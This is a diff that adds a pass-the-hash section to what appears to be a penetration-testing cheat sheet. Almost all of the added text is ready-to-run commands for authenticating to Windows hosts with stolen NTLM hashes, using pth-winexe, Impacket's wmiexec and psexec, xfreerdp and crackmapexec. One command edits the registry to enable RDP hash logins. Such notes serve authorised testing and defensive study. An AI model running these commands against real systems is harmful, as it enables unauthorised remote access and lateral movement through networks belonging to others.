@@ -1,5 +1,37 @@
 # Pass-The-Hash
 
+## Pass-the-Hash
+
+It uses **NTLM Authentication**.
+
+**Important**:
+
+* Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share through SMB.
+* Requires SMB connection through the firewall.
+* Requires Windows File and Print Sharing feature to be enabled.
+
+```bash
+# Method 1
+$ pth-winexe -U [domain]/[username]%[blank_hash]:[ntlm_hash] //[target] [command_to_exec]
+$ pth-winexe -U xor/Administrator%aad3b435b51404eeaad3b435b51404ee:08df31234567890bf6 //10.1.1.1 cmd.exe
+^OR try without domain prefix in -U flag
+
+# Method 2
+$ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
+$ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb
+
+# Method 3
+$ python psexec.py [username]@[target] -hashes :[NT/NTLM]
+
+# Method 4 - RDP PTH
+$ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
+^If error occurs "Account Restrictions are preventing this user from signing in.” enable Restricted Admin Mode:
+$ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+
+# Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
+$ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
+```
+
 ## PTH Tools
 
 ### pth-smbclient
